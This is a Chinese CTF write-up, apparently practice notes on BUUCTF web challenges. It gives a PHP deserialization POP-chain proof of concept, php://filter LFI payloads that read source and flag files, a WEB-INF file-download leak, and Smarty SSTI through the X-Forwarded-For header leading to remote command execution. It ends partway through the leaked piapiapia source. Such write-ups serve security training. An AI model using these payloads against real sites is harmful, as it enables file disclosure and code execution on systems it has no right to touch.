<p>目标是<code>include（）</code>导致的php伪协议漏洞。<br>var可控</p>
<p>因此需要调用<code>invoke（）</code>方法，</p>
<p>继续推导，因此需要触发<code>Test()</code>的return $function ,p可控</p>
<p>观察 <code>__tostring()</code> 函数：返回的是<code>$str</code>的<code>source</code>，可以借此触发<code>__get()</code>方法</p>
<p>利用自带的<code>__wakeup()</code>方法可以调用<code>__tostring（）</code>方法，所以本题不需要绕过wakeup，同样的无法改变source中的值。</p>
<p>构建pop链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用构造方法construct：Show（$Show）-&gt;触发tostring方法后：return this-&gt;Test-&gt;source调用get方法-&gt;利用可控$p将Modifier以函数形式return：$this-&gt;p = new Modifier()-&gt;$var中写入php伪协议：protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">	class Modifier&#123;</span><br><span class="line">		protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	class Show&#123;</span><br><span class="line">		public $source;</span><br><span class="line">		public $str;</span><br><span class="line">		public function __construct($file=&#x27;demo3.php&#x27;)&#123;</span><br><span class="line">			$this-&gt;source = $file;</span><br><span class="line">			echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		public function __toString()&#123;</span><br><span class="line">			return &#x27;666&#x27;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function __wakeup()&#123;</span><br><span class="line">			if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">				echo &quot;hacker&quot;;</span><br><span class="line">				$this-&gt;source = new Show();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	class Test&#123;</span><br><span class="line">	public $p;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$a = new Show();</span><br><span class="line">	$a-&gt;str = new Test();</span><br><span class="line">	$b = new Show($a);</span><br><span class="line">	$s = serialize($b);</span><br><span class="line">	echo $s;</span><br><span class="line">//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:9:&quot;demo3.php&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</span><br><span class="line">	echo &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">	echo urlencode($s);</span><br><span class="line">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22demo3.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>base64解码得到flag</p>
<h2 id="buu靶场练习"><a href="#buu靶场练习" class="headerlink" title="buu靶场练习"></a>buu靶场练习</h2><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://18f8f53f-bbb4-485d-980f-f3b193541f38.node4.buuoj.cn:81/Download?filename=help.docx</span><br></pre></td></tr></table></figure>
<p>本来以为是sql注入题，看到一个help进去，发现了filename存在注入点，首先怀疑文件泄露<br>同时看到了java提示，查找java的文件泄露<br>但试了很久都没什么回显，已知报错，求助wp<br><em>竟然要用POST传GET参，纯纯ex人</em><br>打开help文档<br>全是乱码，再次求助wp<br><em>通常在java开发中会把网页存放在web-inf中</em><br>访问filename=WEB-INF/web.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Index IndexController com.wm.ctf.IndexController IndexController /Index LoginController com.wm.ctf.LoginController LoginController /Login DownloadController com.wm.ctf.DownloadController DownloadController /Download FlagController com.wm.ctf.FlagController FlagController /Flag </span><br></pre></td></tr></table></figure>
<p>在打开一下 com.wm.ctf.FlagController<br>base64解码<br>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9833e109-07db-483d-bfde-adf7718f6b8b&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>存在可利用参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://aeb0b513-5735-4384-992c-efc6593d0d10.node4.buuoj.cn:81/index.php?category=woofers</span><br></pre></td></tr></table></figure>
<p>尝试使用php伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
<p>得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;page-container mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;</span><br><span class="line">          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">              &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">              &lt;?php</span><br><span class="line">				$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#x27;.php&#x27;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#x27;.php&#x27;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br></pre></td></tr></table></figure>
<p>要求存在index参数，用到了php伪协议的嵌套</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>打开flag页面<br>显示本机ip<em>拔对啊，原来是默认设了个数，要用xxf更改</em><br>既然提供了入口参数并且直接回显在页面上@<a href=""></a><br>考虑SSTI<br>那么问题来了，这是哪个模板呢<br>从大佬那偷了张图<br><img src=".%5C19782504-e73756ae84d4d5a4.webp" alt="19782504-e73756ae84d4d5a4.webp"><br>判断得知是Smarty模板<br>对于Smarty模板只需要直接使用<code>&#123;&#123;system('')&#125;&#125;</code>指令<br>成功实现rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls得到：</span><br><span class="line">Your IP is : bootstrap</span><br><span class="line">css</span><br><span class="line">flag.php</span><br><span class="line">header.php</span><br><span class="line">hint.php</span><br><span class="line">img</span><br><span class="line">index.php</span><br><span class="line">jquery</span><br><span class="line">libs</span><br><span class="line">templates_c</span><br><span class="line">templates_c	</span><br></pre></td></tr></table></figure>
<p>CAT flag.php<br>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    	<span class="keyword">require_once</span>(<span class="string">&#x27;header.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">require_once</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) </span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;container panel1\&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;div class=\&quot;row\&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;div class=\&quot;col-md-4\&quot;&gt;	</span></span><br><span class="line"><span class="string">					&lt;/div&gt;</span></span><br><span class="line"><span class="string">					&lt;div class=\&quot;col-md-4\&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;div class=\&quot;jumbotron pan\&quot;&gt;</span></span><br><span class="line"><span class="string">						&lt;div class=\&quot;form-group log\&quot;&gt;</span></span><br><span class="line"><span class="string">							&lt;label&gt;&lt;h2&gt;Your IP is : &quot;</span>;</span><br><span class="line">		<span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);				\\漏洞处</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;				&lt;/h2&gt;&lt;/label&gt;</span></span><br><span class="line"><span class="string">						&lt;/div&gt;		</span></span><br><span class="line"><span class="string">					&lt;/div&gt;</span></span><br><span class="line"><span class="string">					&lt;/div&gt;</span></span><br><span class="line"><span class="string">					&lt;div class=\&quot;col-md-4\&quot;&gt;	</span></span><br><span class="line"><span class="string">					&lt;/div&gt;</span></span><br><span class="line"><span class="string">					&lt;/div&gt;</span></span><br><span class="line"><span class="string">				&lt;/div&gt;&quot;</span>;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回根目录后得到flag</p>
<h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>藏了好几个php页面，但仍然没有什么信息<br>dirsearch扫一下<br><a target="_blank" rel="noopener" href="http://www.zip泄露,现在的题目都扫不出来呢/">www.zip泄露，现在的题目都扫不出来呢</a><br>查看源码<br>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span 